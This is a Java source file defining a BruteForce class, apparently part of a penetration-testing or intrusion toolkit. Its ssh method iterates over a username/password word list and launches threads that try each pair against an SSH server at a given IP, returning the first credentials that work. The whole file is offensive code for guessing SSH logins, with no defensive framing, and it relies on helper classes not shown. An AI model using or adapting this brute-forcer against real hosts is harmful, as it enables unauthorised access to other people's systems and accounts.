package com.example.ubuntu.ives;

import java.util.Iterator;
import java.util.List;
import java.util.Map;

import org.apache.commons.collections4.map.MultiValueMap;

public class BruteForce
{
    public String ssh(String ip)
    {
        String credentials = "";
        SSH ssh = new SSH();
        OBJ_WordList wl = new OBJ_WordList();
        List list;
        MultiValueMap map = wl.getWordList();
        Iterator it = map.entrySet().iterator();
        while (it.hasNext())
        {
            Map.Entry pair = (Map.Entry)it.next();
            list = (List) map.get(pair.getKey());
            outterloop:
            for (int j = 0; j < list.size(); j++)
            {
                if(credentials.equals(""))
                {
                    BruteForceThread thread = new BruteForceThread(ssh, ip, pair, list,
                            j);
                    Thread t = new Thread(thread);
                    t.start();
                    try
                    {
                        t.join();
                    }
                    catch (InterruptedException e)
                    {
                        e.printStackTrace();
                    }
                    if(!thread.getValue().equals(""))
                    {
                        credentials = thread.getValue();
                    }
                }
                else
                    break outterloop;
            }
            it.remove();
        }
        return credentials;
    }
}
